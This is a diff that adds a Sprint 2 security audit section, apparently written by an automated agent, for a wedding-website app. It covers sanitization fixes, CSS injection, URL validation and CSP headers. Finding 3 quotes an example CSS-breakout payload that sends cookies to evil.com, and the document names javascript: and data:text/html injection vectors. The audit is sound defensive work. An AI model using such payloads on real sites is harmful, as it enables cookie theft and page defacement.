@@ -118,3 +118,82 @@
 8. **Subresource Integrity (SRI)**: Add SRI hashes to external scripts/stylesheets if any are used.
 9. **Cookie security**: Verify NextAuth cookies have `Secure`, `HttpOnly`, and `SameSite=Lax` attributes in production (NextAuth defaults should handle this).
 10. **Dependency audit**: Run `npm audit` regularly and keep dependencies up to date.
+
+---
+
+## Sprint 2 — Public Pages & RSVP Security
+
+**Date:** 2026-04-04
+**Auditor:** Security Agent (automated)
+**Scope:** Public wedding websites, CSS injection prevention, sanitization hardening, CSP headers
+
+---
+
+### Issues Found & Fixed
+
+#### 1. HTML Sanitization Bypass via Encoded Entities
+- **OWASP:** A03 Injection
+- **File:** `src/lib/sanitize.ts`
+- **Description:** The original `stripHtml` used a single regex pass (`/<[^>]*>/g`) which could be bypassed using HTML-encoded entities (`&lt;script&gt;`), unclosed tags (`<script`), and null bytes. An attacker submitting RSVP messages or wedding text content could inject HTML that would survive sanitization.
+- **Fix:** Rewrote `stripHtml` to: (1) decode common HTML entities before stripping, (2) iteratively strip tags to catch nested/unclosed constructs, (3) remove null bytes. Added `escapeHtml` for attribute-safe rendering.
+
+#### 2. Missing URL Sanitization
+- **OWASP:** A03 Injection
+- **File:** `src/lib/sanitize.ts`
+- **Description:** URL fields (heroImageUrl, galleryImages, couplePhotoUrl) in WebsiteConfig had no protocol validation. A malicious admin or compromised input could inject `javascript:` URIs or `data:text/html` URIs that execute scripts when loaded.
+- **Fix:** Added `sanitizeUrl()` function that allows only `http:`, `https:`, `data:image/*`, and relative URLs. Blocks `javascript:`, `vbscript:`, `data:text/*`, and all other protocols.
+
+#### 3. CSS Injection via Color/Font Values
+- **OWASP:** A03 Injection
+- **File:** New — `src/lib/validators/css-safe.ts`
+- **Description:** WebsiteConfig colors and font names are rendered as CSS custom properties on public pages. While the Zod schema validates hex format for colors, font names had no allowlist. A crafted font value like `"; background: url(https://evil.com/steal?cookie=` could break out of the CSS value context and exfiltrate data or deface the page.
+- **Fix:** Created `css-safe.ts` with three functions: `safeCssValue()` strips semicolons, braces, `url()`, `expression()`, and other injection vectors; `safeCssColor()` enforces hex-only colors; `safeFontFamily()` validates against an allowlist of known safe fonts.
+
+#### 4. Missing Content-Security-Policy Header
+- **OWASP:** A05 Security Misconfiguration
+- **File:** `next.config.ts`
+- **Description:** No CSP header was configured (flagged as recommendation in Sprint 1). Without CSP, any XSS vulnerability would have unrestricted access to execute scripts, load external resources, and exfiltrate data.
+- **Fix:** Added comprehensive CSP header: restricts scripts to self + unsafe-inline (needed for Next.js), allows Google Fonts, restricts images to known sources (self, Supabase, UploadThing), blocks object/embed, restricts form targets and base URI. Added TODO to migrate from unsafe-inline to nonce-based CSP.
+
+#### 5. Color Validation Enhancement
+- **OWASP:** A03 Injection
+- **File:** `src/lib/sanitize.ts`
+- **Description:** No centralized color sanitization existed. While the Zod schema validates #RRGGBB format, a defense-in-depth `sanitizeColor()` function was missing for use outside Zod contexts.
+- **Fix:** Added `sanitizeColor()` that validates #RGB and #RRGGBB formats and returns a fallback color for invalid input.
+
+---
+
+### Items Reviewed — No Issues Found
+
+#### Website Config Zod Schema (`src/lib/validators/website.ts`)
+- Color fields properly validated with hex regex
+- Text fields use `sanitizeText` transform
+- Field length limits are reasonable
+- Schedule and gallery arrays have max size limits
+
+#### Gift/RSVP Schemas (`src/lib/validators/gift.ts`)
+- Guest name and message fields sanitized with `sanitizeText`
+- Amount fields have min/max bounds
+- Email validated with Zod `.email()`
+
+#### Rate Limiting (`src/lib/rate-limit.ts`)
+- Sliding window algorithm properly implemented (fixed in Sprint 1)
+- Applied to auth and client creation endpoints
+
+---
+
+### Sprint 2 Recommendations
+
+#### High Priority
+1. **Nonce-based CSP**: Replace `'unsafe-inline'` in script-src with per-request nonces. This requires Next.js middleware to inject a nonce into both the CSP header and script tags. Currently blocked by Next.js App Router limitations — revisit when framework support improves.
+2. **Apply `sanitizeUrl()` in Zod schemas**: Add `.transform(sanitizeUrl)` to all URL fields in `websiteConfigSchema` and `giftItemCreateSchema` for defense-in-depth.
+3. **Apply `safeFontFamily()` in website rendering**: When rendering CSS variables on public pages, pass font values through `safeFontFamily()` before injection.
+
+#### Medium Priority
+4. **CSP report-uri**: Add a `report-uri` or `report-to` directive to collect CSP violation reports. This helps detect XSS attempts and policy issues without blocking legitimate functionality.
+5. **RSVP rate limiting**: Add rate limiting to the RSVP submission endpoint to prevent spam.
+6. **Image URL allowlist**: Consider restricting `heroImageUrl`, `galleryImages`, and `couplePhotoUrl` to known domains (Supabase storage, UploadThing) rather than allowing any HTTPS URL.
+
+#### Low Priority
+7. **Trusted Types**: When browser support improves, consider adding Trusted Types CSP directive for additional DOM XSS protection.
+8. **Sanitization tests**: Add unit tests for edge cases in `stripHtml`, `sanitizeUrl`, and `safeCssValue` to prevent regressions.
